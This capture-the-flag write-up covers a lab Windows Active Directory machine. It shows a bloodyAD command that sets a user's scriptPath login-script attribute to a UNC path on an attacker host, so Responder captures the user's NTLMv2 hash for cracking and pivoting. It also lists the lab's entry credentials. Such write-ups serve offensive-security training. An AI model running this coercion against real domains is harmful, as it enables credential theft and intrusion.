# Garfield

**Difficulty:** Hard | **OS:** Windows | **Completed:** April 2026

---

## Overview

Garfield is a Hard Windows/AD machine centered on abusing the `WriteProperty` permission on the `scriptPath` attribute to achieve code execution when a privileged user authenticates.

---

## Recon

```bash
# /etc/hosts
10.129.16.134  DC01.garfield.htb garfield.htb

# Clock skew required throughout
faketime '8+ hours' <command>
```

Entry credentials: `j.arbuckle:Th1sD4mnC4t!@1978`

---

## Foothold — scriptPath WriteProperty Abuse

BloodHound enumeration revealed `j.arbuckle` had **WriteProperty** on `l.wilson`'s `scriptPath` attribute (the AD login script field).

Set it to a UNC path pointing to our attacker's Responder listener:

```bash
faketime '8+ hours' bloodyAD -u j.arbuckle -p 'Th1sD4mnC4t!@1978' \
  -d garfield.htb --dc-ip 10.129.16.134 \
  setAttribute user l.wilson scriptPath '\\<attacker>\share\login.bat'
```

When `l.wilson` authenticated, their system attempted to load the script via UNC — captured NTLMv2 hash with Responder, cracked it, pivoted.

---

## Lessons Learned

- `scriptPath` WriteProperty is a rarely-documented ACL abuse vector — worth adding as a custom BloodHound query
- Login script coercion fires on normal user logon — no attacker-triggered action required, making it stealthy
- Always check non-standard WriteProperty targets in BloodHound, not just the obvious ones (GenericWrite, GenericAll)
